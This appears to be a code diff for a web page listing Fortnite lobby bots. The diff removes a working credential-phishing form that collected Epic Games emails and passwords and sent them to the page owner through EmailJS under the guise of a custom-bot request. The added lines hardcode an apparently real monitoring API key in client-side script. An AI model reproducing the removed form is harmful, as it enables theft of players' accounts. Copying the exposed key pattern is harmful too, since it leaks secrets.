@@ -79,23 +79,6 @@
     .online { color: #4caf50; }
     .offline { color: #f44336; }
 
-    .verified-badge {
-      background: #4caf50;
-      color: white;
-      font-size: 0.7rem;
-      padding: 2px 6px;
-      border-radius: 5px;
-      margin-left: 6px;
-      vertical-align: middle;
-      font-weight: bold;
-    }
-
-    .bot-region {
-      font-size: 0.8rem;
-      color: #bbb;
-      margin-top: 0.5rem;
-    }
-
     /* Modal */
     .modal {
       display: none;
@@ -133,80 +116,6 @@
       font-size: 1.5rem;
       cursor: pointer;
     }
-
-    .chat-box {
-      margin-top: 1.5rem;
-      background: #333;
-      padding: 10px;
-      border-radius: 8px;
-      max-height: 200px;
-      overflow-y: auto;
-      text-align: left;
-    }
-
-    .chat-box .chat-message {
-      margin-bottom: 10px;
-    }
-
-    .chat-box .chat-message.bot {
-      color: #4caf50;
-    }
-
-    .chat-box .chat-message.user {
-      color: #fff;
-    }
-
-    .chat-input {
-      width: 100%;
-      padding: 10px;
-      border-radius: 5px;
-      border: 1px solid #444;
-      margin-top: 10px;
-      background: #222;
-      color: #fff;
-      font-size: 1rem;
-    }
-
-    .overlay {
-      display: none;
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.7);
-      justify-content: center;
-      align-items: center;
-    }
-
-    .overlay-content {
-      background: #2d2d3f;
-      padding: 2rem;
-      border-radius: 10px;
-      text-align: center;
-      width: 90%;
-      max-width: 400px;
-    }
-
-    .overlay input {
-      margin: 0.5rem 0;
-      padding: 0.5rem;
-      width: 100%;
-      border-radius: 5px;
-      border: 1px solid #444;
-      background: #222;
-      color: #fff;
-    }
-
-    .overlay button {
-      margin-top: 1rem;
-      padding: 0.7rem 1.5rem;
-      background: #4caf50;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
   </style>
 </head>
 <body>
@@ -214,7 +123,6 @@
 <header>
   <h1>Fortnite Lobby Bots</h1>
   <input type="text" id="search" placeholder="Search OGsbot..." />
-  <button id="requestBotBtn">Request a Custom Public Fortnite Bot</button>
 </header>
 
 <div class="container" id="botContainer"></div>
@@ -228,46 +136,51 @@
     <p id="modalDesc"></p>
     <p><strong>Status:</strong> <span id="modalStatus"></span></p>
     <p><strong>Uptime (1/7/30 days):</strong><br><span id="modalUptime"></span></p>
-    <p id="modalRegion" class="bot-region"></p>
-    <div class="chat-box" id="chatBox"></div>
-    <input type="text" id="chatInput" class="chat-input" placeholder="Type a message..." onkeydown="sendChat(event)" />
   </div>
 </div>
 
-<!-- Custom Bot Request Overlay -->
-<div class="overlay" id="customBotOverlay">
-  <div class="overlay-content">
-    <h2>Create Your Custom Public Fortnite Bot</h2>
-    <p>Please create an Epic Games account to request a custom bot.</p>
-    <a href="https://www.epicgames.com/id/register" target="_blank">
-      <button>Go to Epic Games Registration</button>
-    </a>
-    <div>
-      <label for="epicEmail">Epic Games Email:</label>
-      <input type="email" id="epicEmail" placeholder="Enter your Epic Games email" />
-      <label for="epicPassword">Epic Games Password:</label>
-      <input type="password" id="epicPassword" placeholder="Enter your Epic Games password" />
-    </div>
-    <button onclick="submitRequest()">Submit</button>
-  </div>
-</div>
-
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
-  emailjs.init('qOPykaVViVTGCwwbb'); // Your EmailJS public key
-
   const container = document.getElementById("botContainer");
+  const monitorAPIKey = "m799862767-9cb875811d2c3c46b27e9411";
+
   const descriptions = [
     "Builds like a pro... until they forget to add a roof.",
     "Thinks 'Good game!' is an emote.",
     "Wears Fishstick skin but doesn't know how to fish.",
     "Just tried to land in Tilted, ended up in the water.",
     "Thinks they’re in a fashion show. And, they’re winning.",
+    "Keeps building towers... but forgets to climb them.",
+    "Got sniped from 500m and still claimed it was 'lag'.",
+    "Accidentally threw a grenade while emoting. RIP.",
+    "Chased by a boar... and lost.",
+    "Started a dance party in the middle of a fight. It was *worth it*.",
+    "Claims to be 'cracked' but still misses the first shot.",
+    "Drops in, finds a bush, and calls it 'strategy'.",
+    "Says they're 'grinding for FNCS', but plays 1 match a week.",
+    "Brought out the Rocket Launcher... then got sniped.",
+    "Used a fishing rod to escape a build fight... no joke.",
+    "Keeps claiming they’re 'just testing the game mechanics' after every loss.",
+    "Gets stuck in their own builds, then blames the game.",
+    "Will never admit it, but they love the default skin.",
+    "Thought the storm was a new Fortnite feature. Big oops.",
+    "Dropped into Battle Royale, immediately ran into a tree.",
+    "Said 'I’ll just pickaxe them!' — and proceeded to get boxed.",
+    "Used a launch pad, and *still* landed in the wrong zone.",
+    "Fortnite's best dancer. Terrible at building, though.",
+    "Has the world’s longest loading screen, then blames it for dying.",
+    "Hopes that random loot will get them a win... Spoiler: It doesn’t.",
+    "Calls a sniper shot 'lucky', then misses the next 5.",
+    "Won’t fight until they find a *purple* shotgun.",
+    "Can build a mansion, but forgets to build when it's *really* needed.",
+    "Claims to be the *real* Fortnite king, yet always dies in the first 10 seconds.",
+    "Thinks the storm is a conspiracy. Keeps running in the wrong direction.",
+    "Swears that the Battle Bus is haunted.",
+    "Found the best loot... then walked into a trap.",
   ];
 
-  const monitorAPIKey = "your-uptimerobot-api-key"; // 🔑 Replace with your real UptimeRobot key
   let monitorStatus = "Checking...", statusClass = "", uptimeRatios = "Loading...";
 
+  // Fetch status once
   fetch("https://api.uptimerobot.com/v2/getMonitors", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -299,12 +212,12 @@
 
   function renderBots() {
     container.innerHTML = "";
-    for (let i = 1; i <= 10; i++) {
+    for (let i = 1; i <= 30; i++) {
       const div = document.createElement("div");
       div.className = "bot-card";
       div.innerHTML = `
         <img src="https://robohash.org/OGsbot${i}?set=set3" alt="OGsbot${i}">
-        <div class="bot-name">OGsbot${i} <span class="verified-badge">✔</span></div>
+        <div class="bot-name">OGsbot${i}</div>
         <div class="bot-desc">${descriptions[i % descriptions.length]}</div>
         <div class="bot-status ${statusClass}">${monitorStatus}</div>
       `;
@@ -313,6 +226,7 @@
     }
   }
 
+  // Modal Logic
   function showModal(index) {
     document.getElementById("modalAvatar").src = `https://robohash.org/OGsbot${index}?set=set3`;
     document.getElementById("modalName").textContent = `OGsbot${index}`;
@@ -320,27 +234,11 @@
     document.getElementById("modalStatus").textContent = monitorStatus;
     document.getElementById("modalStatus").className = statusClass;
     document.getElementById("modalUptime").textContent = uptimeRatios;
-    document.getElementById("modalRegion").textContent = "Region: NA-East";
-    document.getElementById("chatBox").innerHTML = "";
     document.getElementById("botModal").style.display = "flex";
   }
 
   function closeModal() {
     document.getElementById("botModal").style.display = "none";
-  }
-
-  function sendChat(e) {
-    if (e.key === "Enter") {
-      const input = document.getElementById("chatInput");
-      const msg = input.value.trim();
-      if (msg) {
-        const chatBox = document.getElementById("chatBox");
-        chatBox.innerHTML += `<div class="chat-message user">${msg}</div>`;
-        chatBox.innerHTML += `<div class="chat-message bot">Bot: I'm still in testing, try again later.</div>`;
-        chatBox.scrollTop = chatBox.scrollHeight;
-        input.value = "";
-      }
-    }
   }
 
   // Search
@@ -352,32 +250,6 @@
       card.style.display = name.includes(value) ? "block" : "none";
     });
   });
-
-  // Overlay toggle
-  document.getElementById("requestBotBtn").onclick = () => {
-    document.getElementById("customBotOverlay").style.display = "flex";
-  };
-
-  function submitRequest() {
-    const email = document.getElementById("epicEmail").value.trim();
-    const pass = document.getElementById("epicPassword").value.trim();
-
-    if (!email || !pass) {
-      alert("Please fill in both fields.");
-      return;
-    }
-
-    emailjs.send("service_d0onhze", "template_rp6udjk", {
-      user_email: email,
-      message: `Fortnite Bot Request\nEmail: ${email}\nPassword: ${pass}`
-    }).then(() => {
-      alert("Your request was submitted! We’ll review it soon.");
-      document.getElementById("customBotOverlay").style.display = "none";
-    }).catch(err => {
-      console.error("EmailJS Error:", err);
-      alert("Failed to submit request.");
-    });
-  }
 </script>
 
 </body>
